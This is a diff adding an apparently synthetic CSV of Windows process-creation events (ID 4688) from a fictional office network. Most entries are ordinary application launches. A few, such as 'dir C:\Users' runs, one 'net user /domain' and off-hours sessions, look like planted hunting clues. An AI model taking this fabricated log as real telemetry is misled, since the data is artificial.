@@ -1,0 +1,800 @@
+TimeCreated,EventID,EventRecordID,Computer,SubjectUserName,NewProcessName,ParentProcessName,CommandLine
+2026-11-09 01:15:02,4688,100006,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-09 07:56:50,4688,100011,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:04:59,4688,100013,WS-ENG-08,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:09:59,4688,100015,WS-HR-02,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:18:04,4688,100017,WS-HR-07,nisha.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:19:36,4688,100018,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 08:24:53,4688,100019,WS-HR-07,nisha.gupta,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 08:27:08,4688,100022,WS-IT-02,admin02,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:30:05,4688,100025,WS-HR-02,harish.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:33:06,4688,100028,WS-ENG-03,rohan.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:41:00,4688,100031,WS-IT-01,admin01,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 08:45:22,4688,100032,WS-HR-02,sanjay.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 09:03:11,4688,100034,WS-FIN-06,shalini.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:08:47,4688,100036,WS-OPS-05,naveen.das,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:13:25,4688,100038,WS-SALES-04,naveen.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:15:02,4688,100040,WS-FIN-01,karthik.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:17:37,4688,100043,FIN-SRV01,admin02,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-09 09:22:01,4688,100045,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:22:10,4688,100047,WS-FIN-01,karthik.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 09:22:29,4688,100048,WS-HR-07,manoj.verma,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:23:18,4688,100049,WS-FIN-01,karthik.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 09:24:36,4688,100050,WS-IT-02,admin02,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 09:30:08,4688,100052,WS-FIN-06,manoj.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 09:37:39,4688,100053,WS-HR-07,manoj.verma,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 09:40:43,4688,100054,WS-ENG-08,vikram.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 09:46:48,4688,100055,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 09:57:53,4688,100056,WS-IT-02,admin02,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 10:07:35,4688,100059,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 10:09:06,4688,100060,WS-HR-02,sanjay.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 10:11:14,4688,100061,WS-HR-02,harish.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 10:13:28,4688,100062,WS-IT-01,admin01,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 10:25:17,4688,100063,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 10:26:15,4688,100064,WS-FIN-06,manoj.iyer,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 10:28:03,4688,100065,WS-IT-02,admin02,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 10:28:53,4688,100067,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 10:28:55,4688,100068,WS-SALES-04,pooja.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 10:29:27,4688,100070,WS-ENG-08,vikram.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 10:29:34,4688,100071,WS-FIN-01,priya.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 10:39:49,4688,100073,WS-HR-07,manoj.verma,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 10:47:57,4688,100075,WS-HR-07,nisha.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 10:56:22,4688,100076,WS-FIN-01,karthik.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 10:58:55,4688,100077,WS-SALES-04,naveen.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 10:59:19,4688,100078,WS-FIN-06,shalini.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 11:06:02,4688,100079,WS-HR-07,nisha.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 11:10:30,4688,100080,WS-HR-02,harish.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 11:16:37,4688,100082,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 11:38:58,4688,100085,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 11:53:46,4688,100086,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 11:58:30,4688,100087,WS-IT-02,admin02,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 12:00:01,4688,100088,WS-HR-02,sanjay.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 12:00:48,4688,100089,WS-HR-07,manoj.verma,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 12:13:29,4688,100093,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 12:19:38,4688,100096,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 12:28:04,4688,100097,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 12:28:34,4688,100098,WS-IT-01,admin01,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 12:43:16,4688,100102,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 12:44:38,4688,100104,BKP01,admin01,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object Status -eq Stopped"""
+2026-11-09 12:47:47,4688,100106,WS-IT-01,admin01,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 13:00:21,4688,100107,WS-IT-02,admin02,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 13:03:23,4688,100108,WS-FIN-06,manoj.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 13:08:33,4688,100111,WS-ENG-03,rohan.iyer,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 13:08:44,4688,100112,FIN-SRV01,admin02,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\health_check.ps1
+2026-11-09 13:12:04,4688,100114,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 13:12:06,4688,100115,WS-IT-02,admin02,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 13:21:58,4688,100118,WS-OPS-05,naveen.das,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 13:29:51,4688,100120,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 13:31:59,4688,100121,WS-IT-02,admin02,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 13:33:42,4688,100122,WS-FIN-06,manoj.iyer,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 13:36:58,4688,100123,WS-IT-02,admin02,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 13:37:32,4688,100124,WS-FIN-06,manoj.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 13:51:46,4688,100126,WS-SALES-04,naveen.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 14:10:24,4688,100129,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 14:12:52,4688,100130,WS-ENG-03,rohan.iyer,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 14:19:07,4688,100131,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 14:20:25,4688,100132,WS-HR-02,sanjay.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 14:21:54,4688,100133,WS-HR-07,nisha.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 14:22:15,4688,100134,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 14:23:25,4688,100135,WS-ENG-03,rohan.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 14:32:08,4688,100136,WS-SALES-04,pooja.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 14:33:27,4688,100137,WS-FIN-01,priya.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 14:34:20,4688,100138,WS-FIN-01,karthik.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 14:38:29,4688,100139,WS-OPS-05,naveen.das,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 14:46:08,4688,100140,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 14:58:00,4688,100141,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 15:03:08,4688,100144,WS-HR-07,nisha.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 15:05:39,4688,100145,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 15:06:26,4688,100146,WS-HR-02,sanjay.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 15:14:48,4688,100148,WS-SALES-04,naveen.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 15:15:38,4688,100149,WS-HR-02,harish.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 15:20:52,4688,100150,WS-SALES-04,pooja.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 15:36:14,4688,100156,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-09 15:41:35,4688,100159,BKP01,admin02,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\health_check.ps1
+2026-11-09 15:42:20,4688,100160,WS-HR-02,harish.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 15:42:43,4688,100161,WS-FIN-01,priya.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 15:42:52,4688,100162,WS-FIN-06,shalini.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 15:51:07,4688,100167,WS-HR-02,sanjay.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 15:53:16,4688,100168,SQL01,admin01,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c net user /domain
+2026-11-09 15:55:20,4688,100169,WS-SALES-04,pooja.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 16:04:29,4688,100170,WS-FIN-01,priya.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 16:11:41,4688,100172,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 16:14:10,4688,100173,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 16:18:23,4688,100175,WS-HR-07,nisha.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 16:19:39,4688,100176,WS-SALES-04,naveen.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 16:22:59,4688,100178,WS-FIN-06,shalini.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 16:28:09,4688,100179,WS-OPS-05,naveen.das,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 16:32:01,4688,100180,WS-SALES-04,naveen.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-09 16:32:42,4688,100181,WS-SALES-04,naveen.bose,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-09 16:34:52,4688,100183,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 16:35:18,4688,100184,WS-HR-07,manoj.verma,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-09 16:39:17,4688,100186,WS-ENG-03,rohan.iyer,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 16:47:34,4688,100189,WS-SALES-04,naveen.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 16:47:47,4688,100190,WS-ENG-08,vikram.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 16:51:51,4688,100191,WS-FIN-01,karthik.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-09 16:55:44,4688,100192,WS-ENG-08,vikram.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 16:58:58,4688,100195,SQL01,admin01,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-09 17:00:02,4688,100196,WS-FIN-06,manoj.iyer,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 17:05:25,4688,100197,WS-FIN-01,priya.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-09 17:07:05,4688,100198,WS-SALES-04,pooja.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 17:07:14,4688,100199,WS-IT-01,admin01,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 17:18:16,4688,100202,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 17:18:31,4688,100203,FS01,admin01,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-09 17:22:23,4688,100207,WS-IT-02,admin02,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-09 17:28:36,4688,100209,WS-FIN-06,shalini.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 17:46:47,4688,100214,WS-OPS-05,naveen.das,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 20:14:34,4688,100227,WS-OPS-10,priya.kumar,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 20:31:56,4688,100229,WS-OPS-05,karthik.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-09 21:01:05,4688,100230,WS-OPS-05,karthik.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 21:47:54,4688,100231,WS-OPS-05,karthik.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-09 21:55:03,4688,100232,WS-OPS-05,karthik.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-09 23:12:05,4688,100237,WS-OPS-10,priya.kumar,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-09 23:40:48,4688,100238,WS-OPS-05,karthik.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 00:02:56,4688,100241,WS-OPS-05,karthik.bose,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 00:35:29,4688,100242,WS-OPS-10,priya.kumar,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 01:02:55,4688,100246,WS-OPS-10,priya.kumar,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 01:03:37,4688,100247,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-10 01:18:49,4688,100248,WS-OPS-10,priya.kumar,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 02:33:16,4688,100250,WS-OPS-10,priya.kumar,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 02:42:39,4688,100251,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 04:05:46,4688,100253,WS-OPS-05,karthik.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 05:15:02,4688,100255,WS-OPS-05,karthik.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 05:57:42,4688,100256,WS-OPS-05,karthik.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 07:59:33,4688,100261,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:14:03,4688,100263,WS-HR-07,nisha.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:25:01,4688,100265,WS-HR-02,harish.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:25:54,4688,100266,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 08:27:07,4688,100268,WS-ENG-08,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:38:14,4688,100270,WS-IT-02,admin02,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:39:20,4688,100272,WS-FIN-06,shalini.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:47:49,4688,100274,WS-HR-02,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:52:48,4688,100275,WS-HR-07,nisha.gupta,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 08:55:45,4688,100276,WS-FIN-06,shalini.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 08:55:47,4688,100277,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 08:56:14,4688,100279,WS-IT-01,admin01,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 08:58:20,4688,100281,WS-ENG-03,rohan.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:03:54,4688,100284,WS-FIN-01,karthik.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:11:27,4688,100285,WS-IT-01,admin01,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
